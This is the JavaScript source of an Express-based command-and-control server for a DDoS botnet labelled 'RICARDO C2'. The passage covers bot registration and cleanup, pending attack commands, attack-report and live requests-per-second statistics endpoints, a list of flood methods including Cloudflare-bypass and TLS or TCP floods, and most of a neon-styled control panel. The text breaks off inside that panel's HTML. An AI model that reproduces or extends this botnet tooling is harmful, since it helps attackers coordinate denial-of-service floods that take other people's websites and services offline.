const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

const app = express();
app.use(express.json());

const port = process.env.PORT || 5553;
const AUTH_TOKEN = process.env.AUTH_TOKEN || crypto.randomBytes(32).toString('hex'); // Generate random token if not set

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

// Apply rate limiting to API endpoints
app.use('/api/', limiter);

// Simple auth middleware
const authenticate = (req, res, next) => {
  const token = req.headers['authorization'] || req.query.token;
  if (token !== AUTH_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// Store connected bots with auto-approval
let connectedBots = [];
let pendingCommands = {};
let stopCommands = new Set();
let blockedBots = new Set();
let attackHistory = [];

// ========== NEW LIVE REPORTING STATS ==========
let botStats = {
  totalAttacks: 0,
  activeAttacks: 0,
  totalBots: 0,
  // Request tracking
  requestsPerSecond: 0,
  requestsPerMinute: 0,
  totalRequests: 0,
  // Attack stats
  attacksByMethod: {},
  attacksByTarget: {},
  // Bot stats
  botsByStatus: {
    online: 0,
    offline: 0,
    attacking: 0
  },
  // Performance
  averageResponseTime: 0,
  peakRPS: 0,
  peakRPM: 0,
  // History
  lastMinuteRequests: [],
  lastHourAttacks: []
};

// Request tracking
let requestTimestamps = [];
let minuteRequestCount = 0;
let currentMinute = new Date().getMinutes();

// Update RPS/RPM every second
setInterval(() => {
  const now = Date.now();
  // Remove requests older than 1 second
  requestTimestamps = requestTimestamps.filter(ts => now - ts < 1000);
  botStats.requestsPerSecond = requestTimestamps.length;
  
  // Update peak RPS
  if (botStats.requestsPerSecond > botStats.peakRPS) {
    botStats.peakRPS = botStats.requestsPerSecond;
  }
}, 1000);

// Update RPM every minute
setInterval(() => {
  const minute = new Date().getMinutes();
  if (minute !== currentMinute) {
    botStats.requestsPerMinute = minuteRequestCount;
    
    // Update peak RPM
    if (minuteRequestCount > botStats.peakRPM) {
      botStats.peakRPM = minuteRequestCount;
    }
    
    // Store in history
    botStats.lastMinuteRequests.push({
      minute: new Date().toLocaleTimeString(),
      count: minuteRequestCount
    });
    
    // Keep only last 60 minutes
    if (botStats.lastMinuteRequests.length > 60) {
      botStats.lastMinuteRequests.shift();
    }
    
    // Reset counter
    minuteRequestCount = 0;
    currentMinute = minute;
  }
}, 1000);

// Request tracking middleware
app.use((req, res, next) => {
  const start = Date.now();
  
  // Track request
  requestTimestamps.push(start);
  minuteRequestCount++;
  botStats.totalRequests++;
  
  // Track response time
  res.on('finish', () => {
    const duration = Date.now() - start;
    // Update average response time
    if (botStats.averageResponseTime === 0) {
      botStats.averageResponseTime = duration;
    } else {
      botStats.averageResponseTime = (botStats.averageResponseTime * 0.9) + (duration * 0.1);
    }
  });
  
  next();
});
// ========== END NEW STATS ==========

// Bot heartbeat timeout (30 seconds)
const BOT_TIMEOUT = 30000;

// Clean up inactive bots every 10 seconds
setInterval(() => {
  const now = Date.now();
  const beforeCount = connectedBots.length;
  
  connectedBots = connectedBots.filter(bot => {
    if (now - bot.lastSeen > BOT_TIMEOUT) {
      console.log(`[CLEANUP] Removing inactive bot: ${bot.url}`);
      return false;
    }
    return true;
  });
  
  // Update bot status counts
  const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
  botStats.botsByStatus = {
    online: online,
    offline: connectedBots.length - online,
    attacking: activeAttackCount()
  };
  
}, 10000);

// Count active attacks
function activeAttackCount() {
  let count = 0;
  connectedBots.forEach(bot => {
    if (pendingCommands[bot.url]) count++;
  });
  return count;
}

// Validate method files exist
const methodFiles = {
  'CF-BYPASS': 'methods/cf-bypass.js',
  'MODERN-FLOOD': 'methods/modern-flood.js',
  'HTTP-SICARIO': 'methods/REX-COSTUM.js',
  'RAW-HTTP': 'methods/h2-nust.js',
  'R9': 'methods/high-dstat.js',
  'PRIV-TOR': 'methods/w-flood1.js',
  'HOLD-PANEL': 'methods/http-panel.js',
  'R1': 'methods/vhold.js',
  'UAM': 'methods/uam.js',
  'W.I.L': 'methods/wil.js',
  'R10-TCP': 'methods/r10-tcp.js',
  'R10-TLS': 'methods/r10-tls.js',
  'R10-CONN': 'methods/r10-conn.js',
  'R10-HEADER': 'methods/r10-header.js',
  'R10-FRAG': 'methods/r10-frag.js',
  'R10-PIPE': 'methods/r10-pipe.js',
  'R10-COOKIE': 'methods/r10-cookie.js',
  'R10-MIXED': 'methods/r10-mixed.js',
  'R10-LOWCPU': 'methods/r10-lowcpu.js',
  'RAPID10': 'methods/r10-rapid.js' // Just for validation, actual execution is below
};

// Check if method files exist on startup
Object.entries(methodFiles).forEach(([method, file]) => {
  if (!fs.existsSync(file)) {
    console.warn(`[WARNING] Method file not found: ${file} for ${method}`);
  }
});

async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    console.log('\n========================================');
    console.log('🚀 RICARDO C2 SERVER STARTED');
    console.log('========================================');
    console.log(`📍 Local:    http://localhost:${port}`);
    console.log(`📍 Network:  http://${data.origin}:${port}`);
    console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
    console.log(`📊 Live Stats: ENABLED`);
    console.log('========================================\n');
    return data;
  } catch (error) {
    console.log(`📍 Server running at http://localhost:${port}`);
    console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
    console.log(`📊 Live Stats: ENABLED`);
  }
}

// ========== NEW REPORTING ENDPOINT ==========
// Bot attack report endpoint
app.post('/api/report', authenticate, (req, res) => {
  const { botUrl, target, method, requests, duration } = req.body;
  
  // Update stats
  botStats.totalRequests += requests || 0;
  botStats.attacksByMethod[method] = (botStats.attacksByMethod[method] || 0) + 1;
  botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;
  
  // Update bot stats
  const bot = connectedBots.find(b => b.url === botUrl);
  if (bot) {
    bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
    bot.totalRequests = (bot.totalRequests || 0) + (requests || 0);
    bot.lastReport = Date.now();
  }
  
  // Log to console
  console.log(`\n[REPORT] ${botUrl} sent ${requests || 0} requests to ${target} using ${method}`);
  
  res.json({ success: true });
});

// Stats API endpoint
app.get('/api/stats', authenticate, (req, res) => {
  // Update bot stats before sending
  const now = Date.now();
  const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
  
  botStats.botsByStatus = {
    online: online,
    offline: connectedBots.length - online,
    attacking: activeAttackCount()
  };
  
  botStats.totalBots = connectedBots.length;
  
  res.json(botStats);
});
// ========== END NEW REPORTING ==========

// Serve Control UI with embedded token
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RICARDO // COMMAND CENTER</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --neon-cyan: #00f5ff;
            --neon-red: #ff0040;
            --neon-green: #00ff88;
            --neon-yellow: #ffcc00;
            --neon-purple: #bf00ff;
            --bg-void: #010208;
            --bg-panel: rgba(0, 245, 255, 0.03);
            --bg-panel-hover: rgba(0, 245, 255, 0.06);
            --border-dim: rgba(0, 245, 255, 0.12);
            --border-bright: rgba(0, 245, 255, 0.5);
            --text-dim: rgba(0, 245, 255, 0.4);
            --text-mid: rgba(0, 245, 255, 0.7);
            --text-bright: #00f5ff;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Rajdhani', sans-serif;
            background: var(--bg-void);
            color: var(--text-bright);
            min-height: 100vh;
            overflow-x: hidden;
            cursor: crosshair;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(0, 245, 255, 0.015) 2px,
                rgba(0, 245, 255, 0.015) 4px
            );
            pointer-events: none;
            z-index: 9999;
        }

        body::after {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image:
                linear-gradient(rgba(0, 245, 255, 0.04) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 245, 255, 0.04) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 0;
        }

        .header {
            position: relative;
            z-index: 10;
            border-bottom: 1px solid var(--border-dim);
            background: linear-gradient(180deg, rgba(0,245,255,0.05) 0%, transparent 100%);
            padding: 0 2rem;
        }

        .header-inner {
            max-width: 1800px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 70px;
        }

        .logo-block {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .logo-icon {
            width: 44px;
            height: 44px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-icon svg {
            width: 44px;
            height: 44px;
            filter: drop-shadow(0 0 8px var(--neon-cyan));
            animation: logo-pulse 3s ease-in-out infinite;
        }

        @keyframes logo-pulse {
            0%, 100% { filter: drop-shadow(0 0 8px var(--neon-cyan)); }
            50% { filter: drop-shadow(0 0 20px var(--neon-cyan)) drop-shadow(0 0 40px var(--neon-cyan)); }
        }

        .logo-text {
            font-family: 'Orbitron', monospace;
            font-size: 1.3rem;
            font-weight: 900;
            letter-spacing: 0.2em;
            color: var(--neon-cyan);
            text-shadow: 0 0 20px var(--neon-cyan), 0 0 40px rgba(0,245,255,0.3);
        }

        .logo-sub {
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.65rem;
            color: var(--text-dim);
            letter-spacing: 0.3em;
            margin-top: 2px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .status-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.75rem;
            color: var(--text-dim);
            letter-spacing: 0.1em;
        }

        .pulse-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--neon-green);
            box-shadow: 0 0 8px var(--neon-green);
            animation: blink 1.5s ease-in-out infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; box-shadow: 0 0 8px var(--neon-green); }
            50% { opacity: 0.4; box-shadow: 0 0 2px var(--neon-green); }
        }

        .bot-counter {
            font-family: 'Orbitron', monospace;
            font-size: 1.6rem;
            font-weight: 700;
            color: var(--neon-green);
            text-shadow: 0 0 15px var(--neon-green);
        }

        .main {
            position: relative;
            z-index: 10;
            max-width: 1800px;
            margin: 0 auto;
            padding: 2rem;
            display: grid;
            grid-template-columns: 1fr 1fr 400px;
            gap: 1.5rem;
        }

        .col-left { grid-column: 1; }
        .col-right { grid-column: 2; }
        .col-sidebar { grid-column: 3; }

        .panel {
            background: var(--bg-panel);
            border: 1px solid var(--border-dim);
            position: relative;
            transition: border-color 0.3s;
            margin-bottom: 1.5rem;
        }

        .panel::before {
            content: '';
            position: absolute;
            top: -1px; left: 20px; right: 20px;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--neon-cyan), transparent);
        }

        .panel:hover {
            border-color: var(--border-bright);
            background: var(--bg-panel-hover);
        }

        .panel-header {
            padding: 14px 20px;
            border-bottom: 1px solid var(--border-dim);
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: rgba(0, 245, 255, 0.03);
        }

        .panel-title {
            font-family: 'Orbitron', monospace;
            font-size: 0.7rem;
            font-weight: 700;
            letter-spacing: 0.25em;
            color: var(--text-bright);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .panel-title-icon {
            width: 4px;
            height: 14px;
            background: var(--neon-cyan);
            box-shadow: 0 0 8px var(--neon-cyan);
        }

        .panel-badge {
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.6rem;
            padding: 2px 8px;
            border: 1px solid rgba(0, 255, 136, 0.4);
            color: var(--neon-green);
            letter-spacing: 0.15em;
            background: rgba(0, 255, 136, 0.08);
        }

        .panel-badge.red {
            border-color: rgba(255, 0, 64, 0.4);
            color: var(--neon-red);
            background: rgba(255, 0, 64, 0.08);
        }

        .panel-body { padding: 16px 20px; }

        /* NEW STATS GRID */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .stat-panel {
            background: var(--bg-panel);
            border: 1px solid var(--border-dim);
            padding: 1rem;
            position: relative;
            overflow: hidden;
        }

        .stat-panel::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--neon-cyan), transparent);
        }

        .stat-label {
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.7rem;
            color: var(--text-dim);
            letter-spacing: 0.2em;
            margin-bottom: 0.5rem;
        }

        .stat-value {
            font-family: 'Orbitron', monospace;
            font-size: 2rem;
            font-weight: 700;
            color: var(--neon-cyan);
            text-shadow: 0 0 20px var(--neon-cyan);
            line-height: 1;
        }

        .stat-unit {
            font-size: 0.8rem;
            color: var(--text-mid);
            margin-left: 0.25rem;
        }

        .stat-trend {
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.7rem;
            margin-top: 0.5rem;
        }

        .trend-up { color: var(--neon-green); }
        .trend-down { color: var(--neon-red); }

        /* CHARTS */
        .chart-container {
            background: var(--bg-panel);
            border: 1px solid var(--border-dim);
            padding: 1rem;
            margin-bottom: 1.5rem;
            height: 200px;
        }

        canvas {
            width: 100% !important;
            height: 100% !important;
        }

        .method-bar {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin-bottom: 0.5rem;
        }

        .method-name {
            width: 100px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.7rem;
            color: var(--text-mid);
        }

        .method-progress {
            flex: 1;
            height: 20px;
            background: rgba(0, 245, 255, 0.1);
            border: 1px solid var(--border-dim);
            position: relative;
            overflow: hidden;
        }

        .method-progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple));
            width: 0%;
            transition: width 0.3s;
        }

        .method-count {
            width: 50px;
            font-family: 'Orbitron', monospace;
            font-size: 0.8rem;
            color: var(--neon-green);
            text-align: right;
        }

        .peak-indicator {
            position: absolute;
            bottom: 0.5rem;
            right: 0.5rem;
            font-size: 0.6rem;
            color: var(--neon-yellow);
            opacity: 0.5;
        }

        .bot-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 14px;
            border: 1px solid var(--border-dim);
            margin-bottom: 8px;
            background: rgba(0, 245, 255, 0.02);
            transition: all 0.2s;
            position: relative;
            overflow: hidden;
        }

        .bot-item::before {
            content: '';
            position: absolute;
            left: 0; top: 0; bottom: 0;
            width: 2px;
            background: var(--neon-green);
            box-shadow: 0 0 8px var(--neon-green);
        }

        .bot-item.offline::before { background: var(--neon-red); box-shadow: 0 0 8px var(--neon-red); }

        .bot-item:hover {
            border-color: rgba(0, 245, 255, 0.3);
            background: rgba(0, 245, 255, 0.05);
        }

        .bot-info { flex: 1; }

        .bot-url {
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.78rem;
            color: var(--text-bright);
        }

        .bot-meta {
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.6rem;
            color: var(--text-dim);
            margin-top: 3px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .status-tag {
            color: var(--neon-green);
        }

        .status-tag.offline { color: var(--neon-red); }

        .bot-actions { display: flex; gap: 6px; }

        .btn {
            font-family: 'Orbitron', monospace;
            font-size: 0.55rem;
            font-weight: 700;
            letter-spacing: 0.15em;
            padding: 5px 12px;
            border: 1px solid;
            background: transparent;
            cursor: pointer;
            transition: all 0.15s;
            position: relative;
            overflow: hidden;
            text-transform: uppercase;
        }

        .btn::after {
            content: '';
            position: absolute;
            inset: 0;
            background: currentColor;
            opacity: 0;
            transition: opacity 0.15s;
        }

        .btn:hover::after { opacity: 0.1; }

        .btn-remove { border-color: rgba(255, 204, 0, 0.5); color: var(--neon-yellow); }
        .btn-remove:hover { border-color: var(--neon-yellow); box-shadow: 0 0 10px rgba(255,204,0,0.3); }

        .btn-block { border-color: rgba(255, 0, 64, 0.5); color: var(--neon-red); }
        .btn-block:hover { border-color: var(--neon-red); box-shadow: 0 0 10px rgba(255,0,64,0.3); }

        .btn-unblock { border-color: rgba(0, 255, 136, 0.5); color: var(--neon-green); }
        .btn-unblock:hover { border-color: var(--neon-green); box-shadow: 0 0 10px rgba(0,255,136,0.3); }

        .form-group { margin-bottom: 14px; }

        .form-label {
            display: block;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.65rem;
            color: var(--text-dim);
            letter-spacing: 0.2em;
            margin-bottom: 6px;
            text-transform: uppercase;
        }

        .form-input, .form-select {
            width: 100%;
            background: rgba(0, 245, 255, 0.04);
            border: 1px solid var(--border-dim);
            color: var(--text-bright);
            padding: 10px 14px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.8rem;
            outline: none;
            transition: all 0.2s;
            appearance: none;
        }

        .form-input:focus, .form-select:focus {
            border-color: var(--neon-cyan);
            background: rgba(0, 245, 255, 0.08);
            box-shadow: 0 0 15px rgba(0, 245, 255, 0.1), inset 0 0 15px rgba(0, 245, 255, 0.03);
        }

        .form-input::placeholder { color: var(--text-dim); }

        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }

        .attack-btn {
            width: 100%;
            font-family: 'Orbitron', monospace;
            font-size: 0.7rem;
            font-weight: 900;
            letter-spacing: 0.25em;
            padding: 14px;
            border: 1px solid;
            background: transparent;
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            position: relative;
            overflow: hidden;
            margin-bottom: 10px;
        }

        .attack-btn::before {
            content: '';
            position: absolute;
            top: 50%; left: -100%;
            width: 60px; height: 200%;
            background: rgba(255,255,255,0.05);
            transform: translateY(-50%) skewX(-20deg);
            transition: left 0.4s;
        }

        .attack-btn:hover::before { left: 120%; }

        .attack-btn:disabled { opacity: 0.4; cursor: not-allowed; }

        .btn-attack-all {
            border-color: var(--neon-red);
            color: var(--neon-red);
            text-shadow: 0 0 10px var(--neon-red);
        }
        .btn-attack-all:hover:not(:disabled) {
            background: rgba(255, 0, 64, 0.1);
            box-shadow: 0 0 20px rgba(255, 0, 64, 0.3), inset 0 0 20px rgba(255, 0, 64, 0.05);
        }

        .btn-stop {
            border-color: var(--neon-yellow);
            color: var(--neon-yellow);
            text-shadow: 0 0 10px var(--neon-yellow);
        }
        .btn-stop:hover:not(:disabled) {
            background: rgba(255, 204, 0, 0.1);
            box-shadow: 0 0 20px rgba(255, 204, 0, 0.3), inset 0 0 20px rgba(255, 204, 0, 0.05);
        }

        .btn-server {
            border-color: var(--neon-purple);
            color: var(--neon-purple);
            text-shadow: 0 0 10px var(--neon-purple);
        }
        .btn-server:hover:not(:disabled) {
            background: rgba(191, 0, 255, 0.1);
            box-shadow: 0 0 20px rgba(191, 0, 255, 0.3), inset 0 0 20px rgba(191, 0, 255, 0.05);
        }

        .attack-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }

        .log-terminal {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid var(--border-dim);
            height: 280px;
            overflow-y: auto;
            padding: 12px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.72rem;
        }

        .log-terminal::-webkit-scrollbar { width: 4px; }
        .log-terminal::-webkit-scrollbar-track { background: transparent; }
        .log-terminal::-webkit-scrollbar-thumb { background: var(--border-bright); }

        .log-entry {
            margin-bottom: 6px;
            display: flex;
            gap: 10px;
            line-height: 1.4;
        }

        .log-time { color: var(--text-dim); flex-shrink: 0; }
        .log-tag { flex-shrink: 0; font-weight: 700; }
        .log-tag.info { color: var(--neon-cyan); }
        .log-tag.success { color: var(--neon-green); }
        .log-tag.error { color: var(--neon-red); }
        .log-msg { color: var(--text-mid); }

        .log-empty { color: var(--text-dim); text-align: center; padding: 40px 0; letter-spacing: 0.2em; }

        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }

        .stat-card {
            border: 1px solid var(--border-dim);
            padding: 14px;
            text-align: center;
            background: rgba(0, 245, 255, 0.02);
            position: relative;
            overflow: hidden;
        }

        .stat-card::after {
            content: '';
            position: absolute;
            bottom: 0; left: 0; right: 0;
            height: 1px;
        }

        .stat-card.cyan::after { background: var(--neon-cyan); box-shadow: 0 0 6px var(--neon-cyan); }
        .stat-card.green::after { background: var(--neon-green); box-shadow: 0 0 6px var(--neon-green); }
        .stat-card.red::after { background: var(--neon-red); box-shadow: 0 0 6px var(--neon-red); }
        .stat-card.purple::after { background: var(--neon-purple); box-shadow: 0 0 6px var(--neon-purple); }

        .stat-val {
            font-family: 'Orbitron', monospace;
            font-size: 1.6rem;
            font-weight: 700;
            line-height: 1;
        }

        .stat-card.cyan .stat-val { color: var(--neon-cyan); text-shadow: 0 0 15px var(--neon-cyan); }
        .stat-card.green .stat-val { color: var(--neon-green); text-shadow: 0 0 15px var(--neon-green); }
        .stat-card.red .stat-val { color: var(--neon-red); text-shadow: 0 0 15px var(--neon-red); }
        .stat-card.purple .stat-val { color: var(--neon-purple); text-shadow: 0 0 15px var(--neon-purple); }

        .stat-label {
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.58rem;
            color: var(--text-dim);
            letter-spacing: 0.2em;
            margin-top: 6px;
            text-transform: uppercase;
        }

        .method-item {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px 12px;
            border-left: 2px solid;
            margin-bottom: 6px;
            background: rgba(0, 0, 0, 0.3);
            transition: all 0.2s;
        }

        .method-item:hover { background: rgba(0, 245, 255, 0.04); }

        .method-name {
            font-family: 'Orbitron', monospace;
            font-size: 0.65rem;
            font-weight: 700;
            letter-spacing: 0.1em;
        }

        .method-desc {
            font-family: 'Rajdhani', sans-serif;
            font-size: 0.7rem;
            color: var(--text-dim);
        }

        .action-btn {
            width: 100%;
            font-family: 'Orbitron', monospace;
            font-size: 0.6rem;
            font-weight: 700;
            letter-spacing: 0.15em;
            padding: 10px;
            border: 1px solid var(--border-dim);
            background: transparent;
            color: var(--text-mid);
            cursor: pointer;
            transition: all 0.2s;
            text-transform: uppercase;
            margin-bottom: 8px;
            text-align: left;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .action-btn::before {
            content: '▶';
            font-size: 0.5rem;
            opacity: 0.5;
        }

        .action-btn:hover {
            border-color: var(--border-bright);
            color: var(--text-bright);
            background: rgba(0, 245, 255, 0.05);
            box-shadow: 0 0 10px rgba(0, 245, 255, 0.05);
        }

        .action-btn.danger:hover {
            border-color: rgba(255, 0, 64, 0.5);
            color: var(--neon-red);
            background: rgba(255, 0, 64, 0.05);
        }

        .bots-list {
            max-height: 280px;
            overflow-y: auto;
        }

        .bots-list::-webkit-scrollbar { width: 4px; }
        .bots-list::-webkit-scrollbar-track { background: transparent; }
        .bots-list::-webkit-scrollbar-thumb { background: var(--border-bright); }

        .empty-state {
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.7rem;
            color: var(--text-dim);
            text-align: center;
            padding: 30px 0;
            letter-spacing: 0.2em;
        }

        .divider {
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--border-dim), transparent);
            margin: 12px 0;
        }

        .status-alert {
            display: none;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.7rem;
            padding: 10px 14px;
            border: 1px solid rgba(255,0,64,0.3);
            background: rgba(255,0,64,0.05);
            color: var(--text-mid);
            margin-top: 10px;
        }

        .panel::after {
            content: '';
            position: absolute;
            bottom: -1px;
            right: 20px;
            left: 20px;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(0,245,255,0.3), transparent);
        }

        .ticker {
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.6rem;
            color: var(--text-dim);
            letter-spacing: 0.15em;
            overflow: hidden;
            white-space: nowrap;
        }

        .ticker-inner {
            display: inline-block;
            animation: ticker 20s linear infinite;
        }

        @keyframes ticker {
            0% { transform: translateX(100vw); }
            100% { transform: translateX(-100%); }
        }

        .ticker-bar {
            border-top: 1px solid var(--border-dim);
            padding: 6px 2rem;
            background: rgba(0,245,255,0.02);
        }

        @keyframes glitch {
            0%, 90%, 100% { transform: none; text-shadow: 0 0 20px var(--neon-cyan), 0 0 40px rgba(0,245,255,0.3); }
            92% { transform: skewX(-5deg) translateX(2px); text-shadow: -2px 0 var(--neon-red), 2px 0 var(--neon-cyan); }
            94% { transform: skewX(3deg) translateX(-1px); text-shadow: 2px 0 var(--neon-red), -2px 0 var(--neon-cyan); }
            96% { transform: none; }
        }

        .logo-text { animation: glitch 5s ease-in-out infinite; }
        
        .auth-token-display {
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.7rem;
            background: rgba(0,0,0,0.5);
            padding: 4px 8px;
            border: 1px solid var(--border-dim);
            color: var(--neon-yellow);
            cursor: pointer;
        }
        
        .auth-token-display:hover {
            border-color: var(--neon-yellow);
        }
    </style>
</head>
<body>

    <div class="header">
        <div class="header-inner">
            <div class="logo-block">
                <div class="logo-icon">
                    <svg viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <polygon points="22,2 40,12 40,32 22,42 4,32 4,12" stroke="#00f5ff" stroke-width="1.5" fill="rgba(0,245,255,0.05)"/>
                        <polygon points="22,8 35,15 35,29 22,36 9,29 9,15" stroke="#00f5ff" stroke-width="0.8" fill="none" opacity="0.4"/>
                        <circle cx="22" cy="22" r="5" fill="#00f5ff" opacity="0.9"/>
                        <line x1="22" y1="8" x2="22" y2="17" stroke="#00f5ff" stroke-width="1"/>
                        <line x1="22" y1="27" x2="22" y2="36" stroke="#00f5ff" stroke-width="1"/>
                        <line x1="9" y1="15" x2="17" y2="19" stroke="#00f5ff" stroke-width="1"/>
                        <line x1="27" y1="25" x2="35" y2="29" stroke="#00f5ff" stroke-width="1"/>
                        <line x1="35" y1="15" x2="27" y2="19" stroke="#00f5ff" stroke-width="1"/>
                        <line x1="17" y1="25" x2="9" y2="29" stroke="#00f5ff" stroke-width="1"/>
                    </svg>
                </div>
                <div>
                    <div class="logo-text">RICARDO</div>
                    <div class="logo-sub">COMMAND &amp; CONTROL // v2.0</div>
                </div>
            </div>

            <div class="header-right">
                <div class="status-indicator">
                    <div class="pulse-dot"></div>
                    <span>SYSTEM ONLINE</span>
                </div>
                <div style="border-left: 1px solid var(--border-dim); padding-left: 24px;">
                    <div style="font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--text-dim);letter-spacing:0.2em;margin-bottom:2px;">ACTIVE AGENTS</div>
                    <div class="bot-counter" id="botCount">0</div>
                </div>
                <div style="border-left: 1px solid var(--border-dim); padding-left: 24px;">
                    <div style="font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--text-dim);letter-spacing:0.2em;margin-bottom:2px;">UPTIME</div>
                    <div style="font-family:'Orbitron',monospace;font-size:1rem;font-weight:700;color:var(--neon-purple);text-shadow:0 0 10px var(--neon-purple);" id="uptime">00:00</div>
                </div>
            </div>
        </div>
    </div>

    <div class="ticker-bar">
        <div class="ticker">
            <span class="ticker-inner">◈ SYSTEM STATUS: OPERATIONAL &nbsp;&nbsp;&nbsp; ◈ AUTO-REGISTRATION: ENABLED &nbsp;&nbsp;&nbsp; ◈ PROXY POOL: LOADED &nbsp;&nbsp;&nbsp; ◈ ENCRYPTION: AES-256 &nbsp;&nbsp;&nbsp; ◈ LATENCY: &lt;5ms &nbsp;&nbsp;&nbsp; ◈ BOTS ONLINE: <span id="tickerBots">0</span> &nbsp;&nbsp;&nbsp; ◈ LIVE STATS: ACTIVE &nbsp;&nbsp;&nbsp;</span>
        </div>
    </div>

    <div class="main">

        <div class="col-left">

            <!-- NEW LIVE STATS ROW -->
            <div class="stats-grid">
                <div class="stat-panel">
                    <div class="stat-label">REQUESTS/SEC</div>
                    <div class="stat-value" id="rps">0<span class="stat-unit">/s</span></div>
                    <div class="peak-indicator" id="peakRPS">Peak: 0</div>
                </div>
                <div class="stat-panel">
                    <div class="stat-label">REQUESTS/MIN</div>
                    <div class="stat-value" id="rpm">0<span class="stat-unit">/m</span></div>
                    <div class="peak-indicator" id="peakRPM">Peak: 0</div>
                </div>
                <div class="stat-panel">
                    <div class="stat-label">TOTAL REQUESTS</div>
                    <div class="stat-value" id="totalReqs">0</div>
                </div>
                <div class="stat-panel">
                    <div class="stat-label">ACTIVE ATTACKS</div>
                    <div class="stat-value" id="activeAttacksStat">0</div>
                </div>
            </div>

            <!-- CHARTS ROW -->
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem;">
                <div class="chart-container">
                    <canvas id="rpsChart"></canvas>
                </div>
                <div class="chart-container">
                    <canvas id="methodChart"></canvas>
                </div>
            </div>

            <!-- METHOD BREAKDOWN -->
            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">
                        <div class="panel-title-icon"></div>
                        ATTACK METHODS BREAKDOWN
                    </div>
                </div>
                <div class="panel-body" id="methodBreakdown">
                    <div class="empty-state">// NO DATA YET</div>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">
                        <div class="panel-title-icon"></div>
                        CONNECTED AGENTS
                    </div>
                    <div class="panel-badge">AUTO-REG ON</div>
                </div>
                <div class="panel-body">
                    <div class="bots-list" id="botsList">
                        <div class="empty-state">// AWAITING AGENT CONNECTIONS...</div>
                    </div>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <div class="panel-title">
                        <div class="panel-title-icon" style="background:var(--neon-red);box-shadow:0 0 8px var(--neon-red);"></div>
                        BLACKLISTED AGENTS
                    </div>
